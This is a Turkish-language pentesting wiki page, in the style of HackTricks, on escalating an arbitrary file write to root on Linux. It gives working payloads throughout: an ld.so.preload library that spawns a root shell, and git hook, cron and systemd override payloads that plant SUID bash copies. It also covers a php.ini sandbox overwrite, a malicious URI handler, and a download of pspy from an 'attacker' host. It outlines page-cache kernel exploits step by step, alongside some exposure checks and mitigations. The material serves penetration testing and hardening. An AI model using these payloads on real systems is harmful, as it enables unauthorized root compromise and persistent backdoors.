# Root'a Arbitrary File Write

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload`, dynamic linker'ın diğer shared object'lerden önce yüklediği system-wide shared object listesidir. Secure-execution mode, preloading için ek kısıtlamalar uygular; bu nedenle `/tmp/pe.so` gibi bir library path'i evrensel bir SUID-binary tekniği değildir.\
Bu dosyayı oluşturabilir veya değiştirebilirseniz, dosyayı yükleyen bir process, listelenen library'yi diğer shared object'lerinden önce yükler ve bu process'in context'i içinde code execution sağlar.<sup>[[12]](#references)</sup>

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks**, bir repository içindeki commit ve merge işlemleri dahil olmak üzere olaylar için çalıştırılan executable scriptlerdir. Bir **privileged script veya user** bu işlemleri gerçekleştiriyorsa ve saldırgan **`.git` klasörüne yazabiliyorsa**, hook **privilege escalation** için kullanılabilir.<sup>[[13]](#references)</sup>

Örneğin, yeni bir commit oluşturulduğunda her zaman çalıştırılması için bir git repo içinde **`.git/hooks`** konumunda bir **script oluşturmak** mümkündür:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Cron ve Time dosyaları

**root tarafından çalıştırılan cron ile ilgili dosyalara yazabiliyorsanız**, genellikle job bir sonraki çalıştığında code execution elde edebilirsiniz. İlginç hedefler şunlardır:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` veya `/var/spool/cron/crontabs/` içindeki root'un kendi crontab'ı
- `systemd` timer'ları ve bunların tetiklediği servisler

Hızlı kontroller:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipik abuse yolları:

- `/etc/crontab` dosyasına veya `/etc/cron.d/` içindeki bir dosyaya **yeni bir root cron job'ı ekleme**
- `run-parts` tarafından zaten çalıştırılan bir **script'i değiştirme**
- Script'i veya başlattığı binary'yi değiştirerek **mevcut bir timer target'ına backdoor ekleme**

Minimal cron payload örneği:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Yalnızca `run-parts` tarafından kullanılan bir cron dizinine yazabiliyorsanız bunun yerine oraya çalıştırılabilir bir dosya bırakın:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notlar:

- `run-parts` genellikle nokta içeren dosya adlarını yok sayar; bu nedenle `backup.sh` yerine `backup` gibi adları tercih edin.<sup>[[15]](#references)</sup>
- Bazı sistemler klasik cron yerine `systemd` timer'larını kullanır, ancak abuse fikri aynıdır: **root'un daha sonra çalıştıracağı şeyi değiştirmek**.<sup>[[20]](#references)</sup>

### Service & Socket dosyaları

**`systemd` unit dosyalarına** veya bunların referans verdiği dosyalara yazabiliyorsanız, unit'i yeniden yükleyip yeniden başlatarak ya da service/socket activation yolunun tetiklenmesini bekleyerek root olarak code execution elde edebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

İlginç hedefler şunlardır:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` içindeki drop-in override'lar
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` tarafından referans verilen service script'leri/binary'leri
- root service tarafından yüklenen yazılabilir `EnvironmentFile=` yolları

Hızlı kontroller:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Yaygın abuse yolları:

- Değiştirebildiğiniz, root tarafından sahip olunan bir service unit içindeki **`ExecStart=`** değerinin üzerine yazmak
- Kötü amaçlı bir **`ExecStart=`** içeren bir drop-in override eklemek ve önce eski değeri temizlemek
- Unit tarafından zaten referans verilen script/binary dosyasına backdoor eklemek
- Socket bir bağlantı aldığında başlayan ilgili `.service` dosyasını değiştirerek socket-activated service'i hijack etmek

Kötü amaçlı override örneği:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipik etkinleştirme akışı:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Bir servisi kendiniz yeniden başlatamıyor ancak socket-activated birimi düzenleyebiliyorsanız, root olarak backdoored service çalıştırılmasını tetiklemek için yalnızca **bir client bağlantısı beklemeniz** gerekebilir.<sup>[[17]](#references)</sup>

### Privileged bir PHP sandbox tarafından kullanılan kısıtlayıcı `php.ini` dosyasının üzerine yazma

Bazı özel daemon'lar, kullanıcı tarafından sağlanan PHP kodunu **kısıtlı bir `php.ini`** ile `php` çalıştırarak doğrular (örneğin, `disable_functions=exec,system,...`). Sandbox içindeki kod hâlâ **herhangi bir write primitive** (örneğin `file_put_contents`) içeriyorsa ve daemon tarafından kullanılan **tam `php.ini` path'ine** erişebiliyorsanız, kısıtlamaları kaldırmak için bu config'in **üzerine yazabilir** ve ardından elevated privileges ile çalışan ikinci bir payload gönderebilirsiniz.<sup>[[2]](#references)</sup>

Tipik akış:

1. İlk payload sandbox config'inin üzerine yazar.
2. Dangerous functions yeniden etkinleştirildikten sonra ikinci payload kodu çalıştırır.

Minimal örnek (daemon tarafından kullanılan path'i değiştirin):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Daemon root olarak çalışıyorsa (veya root sahipli yollarla doğrulama yapıyorsa), ikinci çalıştırma root bağlamı sağlar. Bu, sandboxed runtime hâlâ dosya yazabiliyorsa temelde **config overwrite üzerinden privilege escalation** anlamına gelir.

### binfmt_misc

`binfmt_misc`, kayıtları `/proc/sys/fs/binfmt_misc` altında sunar; her kayıt bir dosya türü desenini bir interpreter ile ilişkilendirir. Yetki etkisi, kaydı kimin değiştirebildiğine ve daha sonra eşleşen dosyayı hangi işlemin çalıştırdığına bağlıdır; bu nedenle bunu bir privilege-escalation yolu olarak değerlendirmeden önce bu gereksinimleri doğrulayın.<sup>[[21]](#references)</sup>

### Şema işleyicilerini overwrite etme (http: veya https: gibi)

Desktop environment'lar, URI şemaları için bir uygulama seçmek amacıyla MIME association'larını ve desktop entry'lerini kullanır; ilgili per-user configuration ve desktop-entry directory'lerine yazabilen bir attacker, bu şemaları kontrol ettiği bir launcher'a yönlendirebilir. `$HOME/.config/mimeapps.list` dosyasını HTTP ve HTTPS URL handler'larını malicious bir dosyaya yönlendirecek şekilde değiştirerek (örneğin, `x-scheme-handler/http=evil.desktop` ve `x-scheme-handler/https=evil.desktop`), bir kullanıcı tıklaması bu desktop entry'yi çalıştırabilir.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root tarafından kullanıcı tarafından yazılabilir script/binary dosyalarının çalıştırılması

Ayrıcalıklı bir workflow `/bin/sh /home/username/.../script` gibi bir şey çalıştırıyorsa (veya ayrıcalıksız bir kullanıcıya ait bir dizinin içindeki herhangi bir binary dosyasını çalıştırıyorsa), bunu ele geçirebilirsiniz:<sup>[[1]](#references)</sup>

- **Çalıştırmayı tespit edin:** Root'un kullanıcı tarafından kontrol edilen path'leri çağırdığını yakalamak için işlemleri pspy ile izleyin.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Yazılabilirliği doğrula:** hem hedef dosyanın hem de dizinin kullanıcınız tarafından sahiplenildiğinden/yazılabilir olduğundan emin olun.
- **Hedefi ele geçir:** orijinal binary/script dosyasını yedekleyin ve SUID shell oluşturan bir payload (veya başka bir root eylemi) bırakın, ardından izinleri geri yükleyin:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Ayrıcalıklı işlemi tetikleyin** (ör. helper'ı oluşturan bir UI düğmesine basarak). root ele geçirilmiş yolu yeniden çalıştırdığında, `./rootshell -p` ile yükseltilmiş shell'i alın.

### Ayrıcalıklı binary'lerin yalnızca page cache üzerinden değiştirilmesi

Bazı kernel bug'ları dosyayı **disk üzerinde** değiştirmez. Bunun yerine yalnızca okunabilir bir dosyanın **page cache kopyasını** değiştirmenize izin verir. Bir **setuid** veya başka şekilde **root tarafından çalıştırılan** binary'yi hedefleyebilirseniz, sonraki çalıştırma bellekteki saldırgan kontrollü byte'ları çalıştırabilir ve diskteki dosya hash'i değişmeden ayrıcalıkları yükseltebilir.<sup>[[3]](#references)[[4]](#references)</sup>

Bunu **yalnızca çalışma zamanında geçerli olan dosya yazma primitive'i** olarak düşünmek faydalıdır:<sup>[[3]](#references)</sup>

- **Disk temiz kalır**: inode ve diskteki byte'lar değişmez
- **Bellek kirlenir**: cache'lenmiş sayfayı okuyan/çalıştıran process'ler saldırgan tarafından değiştirilmiş içeriği alır
- **Etki geçicidir**: değişiklik reboot veya cache eviction sonrasında ortadan kalkar

Bu primitive, klasik **arbitrary file write** ile Dirty COW / Dirty Pipe gibi eski **page-cache abuse** bug'ları arasında yer alır:<sup>[[3]](#references)</sup>

- Dirty COW bir race koşuluna dayanıyordu
- Dirty Pipe'ın write-position kısıtlamaları vardı
- Page-cache-only primitive, vulnerable path cache'lenmiş file-backed page'lere doğrudan yazma sağlıyorsa daha güvenilir olabilir

#### Generic privesc flow

1. **File-backed page cache page'lerine** yazabilen bir kernel primitive elde edin
2. Bunu **okunabilir ayrıcalıklı bir binary** veya root tarafından çalıştırılan başka bir dosya üzerinde kullanın
3. Page cache'den eviction edilmeden önce çalıştırmayı **tetikleyin**
4. Diskteki dosya değiştirilmemiş görünürken root olarak code execution elde edin

Tipik yüksek değerli hedefler:

- **setuid-root** binary'leri
- **root service'leri** tarafından başlatılan helper'lar
- **Host kernel/page cache'ini paylaşan container'lar** tarafından yaygın olarak çalıştırılan binary'ler

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) bu sınıfa iyi bir örnektir. Vulnerable path, Linux crypto userspace API'si (`AF_ALG` / `algif_aead`) içindeydi:<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`, page-cache page'lerine ait referansları okunabilir bir dosyadan crypto TX scatterlist'ine taşıyabilir
- in-place `algif_aead` decrypt path'i source ve destination buffer'larını yeniden kullandı
- `authencesn` daha sonra destination tag region'a yazdı
- bu region hâlâ spliced file-backed page'lere referans veriyorsa yazma işlemi hedef dosyanın **page cache'ine** ulaştı

Dolayısıyla ilginç teknik CVE'nin kendisi değil, şu pattern'dir:

- **file-backed cache page'lerini bir kernel subsystem'ine beslemek**
- subsystem'in bunları **yazılabilir output** olarak ele almasını sağlamak
- bellekte küçük ve kontrollü bir overwrite tetiklemek

Public PoC, `/usr/bin/su` dosyasını bellekte patch'lemek ve ardından çalıştırmak için tekrarlanan **4-byte write** işlemlerini kullandı.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503), bu kez sink olarak `AF_ALG` yerine **IPsec ESP decrypt** kullanan aynı **page-cache-only write-to-root** pattern'inin başka bir varyantını gösterir.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Önemli teknik **metadata-laundering adımıdır**:

- `splice()`, bir **read-only file-backed page-cache page'ini** ESP-in-UDP packet'ine yerleştirir
- orijinal DirtyFrag mitigation, `esp_input()` decrypt işleminden önce **copy** yapsın diye skb'yi `SKBFL_SHARED_FRAG` ile işaretledi
- netfilter `TEE`, packet'i `nf_dup_ipv4()` -> `__pskb_copy_fclone()` üzerinden çoğaltır
- clone, **aynı physical page-cache referansını** korur ancak `SKBFL_SHARED_FRAG` değerini kaybeder
- `esp_input()` daha sonra clone'u güvenli kabul eder ve file-backed page üzerinde **in-place `cbc(aes)` decrypt** çalıştırır

Dolayısıyla reviewer dersi CVE'den daha geneldir: bir mitigation, bir işlemin önce copy yapıp yapmayacağına karar vermek için **skb/page metadata'sına** dayanıyorsa, backing page'i koruyup metadata'yı düşüren herhangi bir **clone/copy path'i** write primitive'ini sessizce yeniden açabilir.

Tipik exploitation flow:

1. **Özel bir network namespace içinde `CAP_NET_ADMIN`** elde etmek için `unshare(CLONE_NEWUSER | CLONE_NEWNET)`
2. Loopback'i etkinleştirin ve `mangle/OUTPUT` içinde bir **netfilter `TEE` rule** yükleyin
3. `NETLINK_XFRM` üzerinden **XFRM ESP transport SA**'ları yükleyin
4. Her hedef 4-byte word'ü SA `seq_hi` field'ında encode edin (DirtyFrag'in word-selection trick'i)
5. Spliced ESP-in-UDP packet'ini göndererek **TEE clone**'unun `esp_input()`'e ulaşmasını ve **in place** decrypt yapmasını sağlayın
6. `/usr/bin/su` veya başka bir privileged executable'ın page-cache kopyası attacker-controlled code içeriği taşıyana kadar tekrarlayın

Operasyonel olarak etki, `AF_ALG` örneğiyle aynıdır: diskteki dosya temiz kalır, ancak `execve()` **değiştirilmiş page-cache byte'larını** kullanır ve root elde edilir.<sup>[[8]](#references)[[9]](#references)</sup>

Bu varyant için faydalı exposure kontrolleri:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Kısa vadede attack surface'i azaltmak da burada path-specific'tir: `48f6a5356a33` içeren bir kernel'e yükseltmek clone path'ini düzeltirken, `xt_TEE` autoload'unu engellemek **flag-laundering step**'ini ortadan kaldırır ve `esp4` / `esp6`'yı engellemek **decrypt sink**'ini kaldırır.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure ve hunting

Bu bug sınıfından şüpheleniyorsanız yalnızca disk bütünlüğü denetimlerine güvenmeyin. Ayrıca şunları doğrulayın:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Aşağıdaki yapılandırma değerleri, yüklenebilir bir interface ile kernel içine yerleşik bir interface arasındaki farkı gösterir; crypto build kuralları `CONFIG_CRYPTO_USER_API_AEAD` değerini `algif_aead` ile eşler.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` bir modül olarak yüklenebilir/kaldırılabilir
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface kernel içine yerleşiktir
- setuid binary'leri iyi hedeflerdir; çünkü yalnızca page-cache-only bir patch, yerel bir foothold'u root'a dönüştürmek için yeterli olabilir

#### `algif_aead` path'i için saldırı yüzeyinin azaltılması

Vulnerable interface bir loadable module tarafından sağlanıyorsa:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Çekirdeğe derlenmişse, bazı açıklamalarda init yolunun şu şekilde engellendiği bildirilmiştir:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Bu tür bir mitigation'ı diğer kernel LPE'leri için de hatırlamak faydalıdır: exploitation belirli bir optional interface'e bağlıysa, bu interface'i devre dışı bırakmak veya blacklist'e eklemek, tam bir kernel upgrade'i mümkün olmadan önce bile exploit path'ini bozabilir.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – kullanıcı tarafından yazılabilir bir PaperCut dizininde root tarafından çalıştırılan script'in hijacking edilmesi](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) SSS](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 için Openwall oss-security bildirimi](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - out-of-place çalışmaya geri dön](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint teknik yazısı](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE varyantı DirtyClone'u (CVE-2026-43503) inceleme ve exploitation](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: `__pskb_copy_fclone()` içinde `SKBFL_SHARED_FRAG` değerini koru (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux'ta önceki mitigation: splice edilmiş UDP packet'leri için `SKBFL_SHARED_FRAG` ayarla (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian kılavuz sayfası](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel belgeleri](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
